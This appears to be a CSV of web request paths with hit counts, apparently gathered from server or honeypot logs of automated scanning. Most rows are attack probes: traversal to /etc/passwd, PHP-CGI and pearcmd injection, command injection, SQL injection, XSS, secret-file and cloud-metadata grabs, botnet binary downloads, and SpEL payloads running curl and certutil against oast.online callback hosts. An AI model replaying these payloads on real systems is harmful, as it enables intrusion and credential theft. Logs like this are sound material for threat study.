path,count
/git-crypt-key-file,3
/git/.git/config,7
/git/notifyCommit?url=2pXsbMOthprC8O5y2GnvtT0mApx&branches=2pXsbMOthprC8O5y2GnvtT0mApx,1
/git/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,7
/git/xipada/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/github-actions-secrets.json,3
/github-actions/.env.secrets,3
/github-app-private-key.pem,3
/gitlab-ci-secret-variables,3
/gitlab-ci.yml,7
/gitlab-ci/.env.variables,3
/gitlab-ci/config.json,4
/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,1
/gitlab/config/gitlab-secrets.json,3
/global-protect/login.esp,5
/global-protect/portal/images/2uSlfIZe0ADR9r7lPvlhu0PKHNw.txt,2
/global-protect/prelogin.esp,7
/global.json,4
/globalSIPsettings.html,1
/globals/e_detector/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/glpi/plugins/barcode/front/send.php?file=../../../../../../../../etc/passwd,1
/glpi/vendor/htmlawed/htmlawed/htmLawedTest.php,6
/glue-connection-properties,3
/gmips,37
/gmpsl,43
/gnjqwpc,14
/go.sh,27
/go.sum,4
/go/add-on/business-continuity/api/plugin?folderName&pluginName=../../../etc/passwd,1
/go/add-on/business-continuity/api/plugin?folderName=&pluginName=../../../../../../../../etc/passwd,1
/go/add-on/business-continuity/api/plugin?folderName=&pluginName=../../../../../../../../windows/win.ini,1
/go2growApi/payment/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/go2growApi/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/goahead,27
/goanywhere/images/..;/wizard/InitialAccountSetup.xhtml,5
/gocd/pipeline.gocd.xml,4
/gocl,30
/godot/.env.export,3
/goform/WriteFacMac?mac=;ping%20-c%204%20194.107.126.7;,1
/goform/formJsonAjaxReq,6
/goform/mcr_setWol?wol_mac=ping+146.19.24.76&redirect_url=/new/UserFolder/3_6_2_wakeonlan.asp,3
/goform/setSysAdm,1
/goform/setVpnCfg,2
/goform/set_LimitClient_cfg,11
/goforms/menu,1
/gol,1
/google-api-private-key.json,1
/google-cloud-run-secrets,3
/google-cloud-sdk/.install/.backup/.backup,1
/google-cloud-sdk/bin/bootstrapping/install.py,2
/google-cloud-sdk/bin/bootstrapping/install_bundled_python.py,2
/google-cloud-sdk/bin/gcloud,2
/google-cloud-sdk/bin/gcloud.bak,2
/google-cloud-sdk/configurations/config_default,2
/google-cloud-sdk/lib/googlecloudsdk/core/config.json,1
/google-cloud-sdk/lib/googlecloudsdk/core/config.pyo,2
/google-cloud-sdk/lib/googlecloudsdk/core/util/files.pyc,2
/google-cloud-sdk/lib/googlecloudsdk/core/util/files.pyo,1
/google-cloud-sdk/lib/googlecloudsdk/gcloud.py,2
/google-cloud-sdk/lib/googlecloudsdk/gcloud.pyo,2
/google-cloud-sdk/platform/google_appengine/appcfg.py,1
/google-cloud-sdk/platform/google_appengine/dev_appserver.pyo,2
/google-cloud/.env.gcp,3
/google.php,1
/googlepay/settings.json,4
/goto?dest=,4
/gov.mips,1
/governance/proposals.md,4
/gp,2
/gpon,2
/gppc,26
/gqz,1
/gradle.properties,6
/grafana,4
/grafana.ini,4
/grafana/.env,2
/grafana/agent.yaml,4
/grafana/grafana.ini,3
/grandstream.sh,2
/grandstream/,1
/graph-sdk/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/graph.php,29
/graph.php?module=upload,3
/graph.php?module=upload&11,3
/graph_realtime.php?action=init,1
/graphiql,4
/graphql,21
/graphql-playground,4
/graphql/,4
/graphql/favicon.ico,4
/graphql/query,4
/graphql?query={__schema{types{name}}},4
/graylog/graylog.conf,3
/greenshaded/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/grems-api/.env,1
/group_vars/all.yml,4
/grr,1
/gsprout.exe,3
/gst/gst_system/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/gst_system/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/gtag/js,4
/gtb,1
/guacamole/user-mapping.xml,4
/guest_auth/guestIsUp.php,1
/gulpfile.js,10
/guw,1
/gx86,46
/gyd.sh,1
/h,27
/h.sh,2
/h2-console,1
/hair.sh,2
/hakai.ppc,1
/hakka.arm6l,1
/hakka.ppc440,1
/hakka.ssh4,1
/hammad/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/happyaxis.jsp,1
/haproxy.cfg,4
/haproxy/haproxy.cfg,4
/harbor-registry-secrets,4
/harbor/,1
/hardhat.config.js,4
/harm4,15
/harm5,26
/hash/.env,9
/hasura-graphql-admin-secret,3
/hasura/.env,9
/hax/..CFIDE/wizards/common/utils.cfc?method=wizardHash&inPassword=foo&_cfclient=true&returnFormat=wddx,1
/hax?jsp=/app/rest/server;.jsp,1
/hbk,1
/hc/en-us,4
/hcq,1
/hdawd.mips,1
/health.php,3
/health/,1
/healthcheck.php,3
/healthcheck/,1
/healthchecks/,1
/healthz,2
/heapdump,2
/heapdump/,1
/hedwig.cgi,1
/hell.sh,2
/hell.spc,1
/hello,55
/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input,43
/helm-secrets-plugin.yaml,3
/helm/Chart.yaml,4
/helm/releases.yaml,4
/helm/values.yaml,1547
/helmfile.yaml,4
/help,15
/help/,13
/help/../../etc/shadow,1
/help/.git/config,4
/help/administration/index.md,2
/help/api/README.md,1
/help/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/help/ci/docker/using_docker_images.md,1
/help/ci/examples/README.md,1
/help/ci/quick_start/README.md,1
/help/ci/yaml/README.md,2
/help/config.all.php,6
/help/config.all.php?x,3
/help/gitlab-basics/create-project.md,1
/help/gitlab-basics/fork-project.md,1
/help/img/devops_lifecycle.png,1
/help/info.php,1
/help/instance_configuration,2
/help/phpinfo.php,2
/help/public_access/public_access.md,1
/help/ssh/README.md,3
/help/topics/autodevops/index.md,1
/help/user/discussions/index.md,2
/help/user/group/index.md,1
/help/user/group/subgroups/index.md,1
/help/user/index.md,3
/help/user/project/clusters/index.md,1
/help/user/project/container_registry.md,3
/help/user/project/description_templates.md,1
/help/user/project/import/index.md,1
/help/user/project/index.md,1
/help/user/project/integrations/mattermost_slash_commands.md,1
/help/user/project/integrations/slack_slash_commands.md,1
/help/user/project/issue_board.md,1
/help/user/project/issues/index.md,1
/help/user/project/labels.md,1
/help/user/project/merge_requests/index.md,2
/help/user/project/merge_requests/work_in_progress_merge_requests.md,1
/help/user/project/milestones/index.md,1
/help/user/project/pages/index.md,1
/help/user/project/protected_branches.md,1
/help/user/project/quick_actions.md,1
/help/user/project/repository/branches/index.md,3
/help/user/project/repository/gpg_signed_commits/index.md,1
/help/user/project/repository/index.md,4
/help/user/project/repository/web_editor.md,6
/help/user/project/settings/import_export.md,1
/help/user/project/settings/index.md,1
/help/user/project/web_ide/index.md,1
/help/user/project/wiki/index.md,1
/help/user/search/index.md,1
/help/user/snippets.md,1
/help/workflow/importing/migrating_from_svn.md,1
/help/workflow/todos.md,1
/helpdesk/WebObjects/Helpdesk.woa,15
/helpdesk/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/helper.js,723
/helper/EmailHelper.js,722
/helper/helper.go,2
/helper/info.php,1
/helper/phpinfo.php,2
/helpers/fileUpload.js,2
/helpers/helper.js,1
/helpers/sendEmail.js,1
/helpers/utility.js,727
/heralding/config.json,4
/heroku-private-space-keys,3
/heroku-secret-config-backup,3
/heroku.yml,2
/heroku/.env.dyno,3
/hetzner/backup_smtp.bak,3
/hf/settings.json,4
/hf_token.env,4
/hhh.root32,1
/hidakibest.arm4,45
/hidakibest.arm5,42
/hidakibest.arm6,41
/hidakibest.arm7,41
/hidakibest.mips,44
/hidakibest.mpsl,41
/hidakibest.ppc,46
/hidakibest.sh,3
/hidakibest.sparc,43
/hidakibest.x86,43
/hidden,2
/hidden-services/map.json,4
/hidden/phpinfo.php,2
/hiddenbin/Space.arc,13
/hiddenbin/Space.arm,20
/hiddenbin/Space.arm5,20
/hiddenbin/Space.arm6,18
/hiddenbin/Space.arm7,13
/hiddenbin/Space.i686,12
/hiddenbin/Space.m68k,18
/hiddenbin/Space.mips,11
/hiddenbin/Space.mpsl,12
/hiddenbin/Space.ppc,12
/hiddenbin/Space.sh4,14
/hiddenbin/Space.spc,17
/hiddenbin/Space.x86,13
/hiddenbin/Space.x86_64,16
/hiddenbin/boatnet.arc,17
/hiddenbin/boatnet.arm,13
/hiddenbin/boatnet.arm5,14
/hiddenbin/boatnet.arm6,14
/hiddenbin/boatnet.arm7,11
/hiddenbin/boatnet.i686,17
/hiddenbin/boatnet.m68k,11
/hiddenbin/boatnet.mips,16
/hiddenbin/boatnet.mpsl,14
/hiddenbin/boatnet.ppc,16
/hiddenbin/boatnet.sh4,12
/hiddenbin/boatnet.spc,17
/hiddenbin/boatnet.x86,16
/hiddenbin/boatnet.x86_64,11
/hiddenbin/wind.arm,17
/hiddenbin/wind.arm5,13
/hiddenbin/wind.arm6,11
/hiddenbin/wind.arm7,8
/hiddenbin/wind.m68k,12
/hiddenbin/wind.mips,13
/hiddenbin/wind.mpsl,14
/hiddenbin/wind.ppc,12
/hiddenbin/wind.sh4,10
/hiddenbin/wind.x86,14
/him/api/rest/V1.0/system/log/list?filePath=../,1
/hjAI,1
/hkl,1
/hmi/config.json,4
/hmips,37
/hmv,1
/hn8N,1
/hoderi.m68k,1
/hoho.arm,26
/hoho.arm5,27
/hoho.arm6,27
/hoho.arm7,27
/hoho.m68k,27
/hoho.mips,27
/hoho.mpsl,27
/hoho.ppc,27
/hoho.sh4,27
/hoho.x86,27
/home,2
/home.asp,1
/home.aspx,1
/home.html,1
/home.jsp,1
/home.php,2
/home.zip,9
/home/,4
/home/.aws/credentials,2
/home/.env,18
/home/.git/config,6
/home/<USER>/.aws/config,2
/home/<USER>/.aws/credentials,2
/home/admin/.env,3
/home/download,1
/home/droplet/.ssh/authorized_keys.digitalocean,3
/home/ubuntu/.aws/config,3
/home/user/.aws/config,1
/home/user/.aws/credentials,1
/home/user/.bash_profile,3
/home/user/.config/,4
/home/user/.config/msmtp/config,2
/home/user/.env,5
/home/user/.fetchmailrc,2
/home/user/.forward,2
/home/user/.mailrc,7
/home/user/.msmtprc,10
/home/user/.muttrc,19
/home/user/.procmailrc,2
/home/user/.zshrc,3
/home/user/config.zip,3
/home/user/phpinfo.php,3
/home/www/.env,3
/homeaction.php,1
/homepage.nsf,1
/homepage.nsf/homePage.gif?OpenImageResource,1
/homepage/,1
/hop.php?/12345,1
/horde/.env,2
/horde/admin/user.php,1
/horizon.mips,1
/host-manager-howto.html,3
/host-manager/html,13
/hosts,5
/housingbook/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/hp/device/this.LCDispatcher,1
/hp/device/webAccess/index.htm,1
/hplogo.gif,1
/hpwebjetadmin/,1
/hr/,4
/hsbc/acceso/,6
/hsn.sh,1
/hsqldb%0a,1
/htaccess/workspace/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/htdocs.7z,4
/htdocs.zip,190
/htdocs/.env,4
/html-manager-howto.html,2
/html.7z,4
/html.gz,4
/html.rar,4
/html.tar,4
/html.tar.gz,4
/html.zip,193
/html/,3
/html/.env,29
/html/.git/config,4
/html/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/html/log,1
/html/phpinfo.php,6
/html/recordings/index.php,5
/html/website-backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/html2pdf-master/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/htmltopdf/downfile.php?filename=/windows/win.ini,1
/htpasswd,2
/http.txt,1
/http/.env,1
/http://168.63.129.16/metadata/instance?api-version=2021-02-01,3
/http://169.254.169.254/latest/meta-data/iam/security-credentials/,3
/http://metadata.google.internal/computeMetadata/v1/,3
/httpboot/.env,3
/httpd.conf,22
/httpd/.env,6
/httpdocs/.env,6
/hudson,186
/hudson/login,1
/hudson/script,9
/hue/assets/..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2fpasswd,1
/huggingface/.env.transformers,3
/huggingface/token,4
/huhu.rmv4l,1
/humans.txt,3
/huntforx86bins.x86_32,1
/hw-sys.htm,1
/hyperledger/.env.channel,3
/hystrix/;a=a/__$%7BT%20%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22certutil%20-urlcache%20-split%20-f%20http://ct553c916vc7v40lu5f0uzegsauoxk5f1.oast.online%22%29%7D__::.x/,1
/hystrix/;a=a/__$%7BT%20%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22curl%20http://ct553c916vc7v40lu5f0h5zimpw165yit.oast.online%22%29%7D__::.x/,1
/i,46
/i-5.8-6.Sakura,43
/i.dat,1
/i.php,22
/i18n/EN/css/foundstone.css,1
/i18n/EN/images/external_nav_square.gif,1
/i3geo/exemplos/codemirror.php?pagina=../../../../../../../../../../../../../../../../../etc/passwd,1
/i486,35
/i486.lmfao293reuj239jrf234rft34jt,1
/i486.systemservice,1
/i486IoT,1
/i5,27
/i586,39
/i586.0x08,1
/i586.k1337,1
/i586kmy,1
/i6,28
/i686,42
/i686.Tnxl,1
/iNotes/Forms5.nsf/$DefaultNav,1
/iR8yH0i1CmTagbpd5LAkUyKPelq5OSIWoO,27
/iSee857/session,2
/iUeQQNFZ9vwOLXIBiZ4156FCf1nexMVYnW,27
/iam/role_assume_policy.json,3
/iau.sh,1
/ibfv1/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/ibm/console/logon.jsp?action=OK,1
/ibmq/creds.env,4
/ica.sh,1
/icinga-web/lib/icinga/icinga-php-thirdparty/etc/passwd,1
/icinga2/lib/icinga/icinga-php-thirdparty/etc/passwd,1
/iclock/ccccc/windows/win.ini,1
/icon/.env,2
/icons/,4
/icons/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd,1
/icons/ecblank.gif,2
/icons/icon_homeportal_2701XX.gif,1
/icons/icon_set_up_2701XX_01.gif,1
/ics/network_map.png,4
/id/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/id_rsa,6
/id_rsa.pub,6
/identity,19
/identity/walletconnect.yaml,4
/idx_config/,8
/ie_index.htm,1
/ifrc-laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/igcqnvererclkkth,1
/ign-project-backend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/igtny.com/igt/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/ih2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/iissamples/,1
/ikiwiki/.env,4
/ilo.gif,1
/im/,1
/imadguennouni/all/spotbills/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/imadguennouni/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/image/image%3A%2F%2F%2e%2e%252fetc%252fpasswd,1
/image/lgbg.jpg,21
/images,1
/images../.git/config,6
/images/..%2finfo.html,3
/images/.env,14
/images/.git/config,50
/images//////////////////../../../../../../../../etc/passwd,1
/images/Safeword_Token.jpg,1
/images/arrow_collapsed.png,5
/images/arrow_expanded.png,6
/images/asf-logo.svg,3
/images/bbc__xl.gif,1
/images/btn_help_nml.gif,1
/images/bullet_diamond.png,1
/images/bullet_end.png,1
/images/bullet_go.png,1
/images/config.all.php,6
/images/config.all.php?x,3
/images/ctxHeader01.jpg,1
/images/docs-stylesheet.css,3
/images/editor/separator.gif,3
/images/feed.png,9
/images/hdr_icon_homeG.gif,1
/images/icon_server_connected.gif,1
/images/isslogo.gif,1
/images/lexbold.gif,1
/images/lexlogo.gif,1
/images/logo-arcsight.gif,1
/images/logo.blu.png,6
/images/logo.png,3
/images/magnifier.png,2
/images/mute_alloff.gif,1
/images/oBo.php,3
/images/outlook.jpg,1
/images/pic_bri.gif,1
/images/printer.gif,1
/images/rails.png,1
/images/raisecom/,9
/images/reload.png,6
/images/sort_asc.png,2
/images/sort_desc.png,27
/images/stxx__xl.gif,1
/images/toggle_check.png,6
/images/zoom_in.png,2
/images/zoom_out.png,2
/imc/,2
/imc/javax.faces.resource/dynamiccontent.properties.xhtml,1
/imcat/root/tools/adbug/binfo.php?phpinfo1,1
/imcws/,1
/img../.git/config,4
/img.php?f=/./etc/./passwd,1
/img/../../../../../../etc/passwd,1
/img/.env,6
/img/.git/config,4
/img/cake.icon.gif,1
/img/cake.icon.png,1
/img/launch-button-big-green.gif,22
/img/launch-button-big.gif,22
/img/plain-background.png,22
/img/tomcat.png,24
/implant/build_settings.yaml,4
/import/.env,9
/imuva/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/in.php,696
/inc/.env,37
/include/,3
/include/.env,16
/include/.env.config,3
/include/.git/config,3
/include/config.all.php,6
/include/config.all.php?x,3
/include/downmix.inc.php,2
/include/exportUser.php?type=3&cla=application&func=_exec&opt=(expr%20943062875%20%2B%20952725725)%3Epepmbfcilq,1
/include/lzns.txt,1
"/include/makecvs.php?Event=http|echo%20""<?php%20echo%20md5(sahvhjzxxu);unlink(__FILE__);?>""%20>>%20/usr/www/sahvhjzxxu.php%20&&%20chmod%20755%20/usr/www/sahvhjzxxu.php||",1
/include/thumb.php?dir=http/.....///.....///config/config_db.php,1
/include/thumb.php?dir=http\..\admin\login\login_check.php,1
/includes/.env,15
/includes/.git/config,7
/includes/conf.php,4
/includes/config.php,6
/includes/configuration.php,2
/includes/configure.php,4
/includes/database.php,6
/includes/mysql2i/mysql2i.func.php,1
/includes/settings.inc.php,2
/includes/settings.php,6
/index,1
/index.7z,1
/index.action,6
/index.asp,2
/index.bak,5
/index.db,1
/index.do,5
/index.gz,1
/index.htm?PAGE=web,1
/index.html,786
/index.js,754
/index.json,1
/index.jsp,84
/index.md,2
/index.php,738
/index.php.bak,4
/index.php/Home/uploadify/fileList?type=.+&path=../,1
/index.php/Pan/ShareUrl/downloadSharedFile?true_path=../../../../../../windows/win.ini&file_name=win.ini,1
/index.php/System/MailConnect/host/ct553c916vc7v40lu5f0n8k7mrr1orw8o.oast.online/port/80/secure/,1
/index.php/admin,4
/index.php/admin/filemanager/sa/getZipFile?path=/../../../../../../../etc/passwd,1
/index.php/bbs/index/download?url=/etc/passwd&name=1.txt&local=1,1
/index.php/catalogsearch/advanced/result/?name=e,1
/index.php/component/jemessenger/box_details?task=download&dw_file=../../.././../../../etc/passwd,1
/index.php/core/js/oc.js,4
/index.php/core/js/oc.js?v=a9e1a600d8a15933c86dcad2284676cf,60
/index.php/dashboard/,4
/index.php/dashboard/sitemap/,4
/index.php/install,4
/index.php/login,4
/index.php/phpinfo,23
/index.php/updater,4
/index.php/wp-json/wp/v2/posts/,1
/index.php/wp-json/wp/v2/sensei_email/,1
/index.php?%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input,1
/index.php?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input,1
/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input,2
"/index.php?a=fetch&content=%3C?php+file_put_contents(%2210831.php%22,%22%3C?php+echo+1613531552%3B%22)%3B",1
/index.php?act=op&pid=10,2
/index.php?action=login.index&host=0,1
/index.php?action=porte_plume_previsu,1
/index.php?app=main&inc=core_auth&route=login,1
/index.php?controller=pjAdminOrders%26action%3dpjActionGetNewOrder%26column%3d(SELECT+(CASE+WHEN+(4213%3d4213)+THEN+0x63726561746564+ELSE+(SELECT+7877+UNION+SELECT+7153)+END))%26direction%3dASC%26page%3d1%26rowCount%3d50%26q%3d%e2%80%99%e2%80%99%26type%3d,1
/index.php?controller=pjAdminOrders%26action%3dpjActionGetNewOrder%26column%3dcreated%26direction%3dASC%26page%3d1%26rowCount%3d50%26q%3d-1910%27)+OR+6100%3d6100%23%26type%3d,1
/index.php?download=/etc/passwd,1
/index.php?lang=../../../../../../../../tmp/index1,482
"/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(""hi""));?>+/tmp/index1.php",482
/index.php?lang=en,37
/index.php?m=vod-search&wd={if-A:printf(md5(917719773))}{endif-A},1
/index.php?op=fileviewer&file=/etc/passwd,1
/index.php?option=com_abbrev&controller=../../../../../../../../../../etc/passwd%00,1
/index.php?option=com_addressbook&controller=../../../../../../../../../../etc/passwd%00,1
/index.php?option=com_album&Itemid=128&target=../../../../../../../../../etc/passwd,1
/index.php?option=com_beeheard&controller=../../../../../../../../../../etc/passwd%00,1
/index.php?option=com_bfsurvey&controller=../../../../../../../../../../../../etc/passwd%00,1
/index.php?option=com_biblestudy&id=1&view=studieslist&controller=../../../../../../../../etc/passwd,1
/index.php?option=com_blogfactory&controller=../../../../../../../../../../etc/passwd%00,1
/index.php?option=com_canteen&controller=../../../../../etc/passwd%00,1
/index.php?option=com_content,4
/index.php?option=com_dioneformwizard&controller=../../../../../../../../../../../../../etc/passwd%00,1
/index.php?option=com_gadgetfactory&controller=../../../../../../../../../../etc/passwd%00,1
/index.php?option=com_gcalendar&controller=../../../../../etc/passwd%00,1
/index.php?option=com_graphics&controller=../../../../../../../../../etc/passwd%00,1
/index.php?option=com_horoscope&controller=../../../../../../../../../../etc/passwd%00,1
/index.php?option=com_if_surfalert&controller=../../../../../../../../../../etc/passwd%00,1
/index.php?option=com_imagebrowser&folder=../../../../etc/passwd,1
/index.php?option=com_jejob&view=../../../../../../etc/passwd%00,1
/index.php?option=com_jequoteform&view=../../../../../../etc/passwd%00,1
/index.php?option=com_jimtawl&Itemid=12&task=../../../../../../../../../../../../etc/passwd%00,1
/index.php?option=com_joomlaflickr&controller=../../../../../../../../../../etc/passwd%00,1
/index.php?option=com_joomlapicasa2&controller=../../../../../etc/passwd%00,1
/index.php?option=com_jphone&controller=../../../../../../../../../../etc/passwd%00,1
/index.php?option=com_jradio&controller=../../../../../../../../../../../../etc/passwd%00,1
/index.php?option=com_jstore&controller=./../../../../../../../../etc/passwd%00,1
/index.php?option=com_jtagmembersdirectory&task=attachment&download_file=../../../../../../../../../../../etc/passwd,1
/index.php?option=com_jwhmcs&controller=../../../../../../../../../../etc/passwd%00,1
/index.php?option=com_kif_nexus&controller=../../../../../../../../../etc/passwd,1
/index.php?option=com_lovefactory&controller=../../../../../../../../../../etc/passwd%00,1
/index.php?option=com_matamko&controller=../../../../../../../../../../etc/passwd%00,1
/index.php?option=com_mscomment&controller=../../../../../../../../../../../../../../../etc/passwd%00,1
/index.php?option=com_multimap&controller=../../../../../../../../../../etc/passwd%00,1
/index.php?option=com_multiroot&controller=../../../../../../../../../../etc/passwd%00,1
/index.php?option=com_omphotogallery&controller=../../../../../../../../../etc/passwd,1
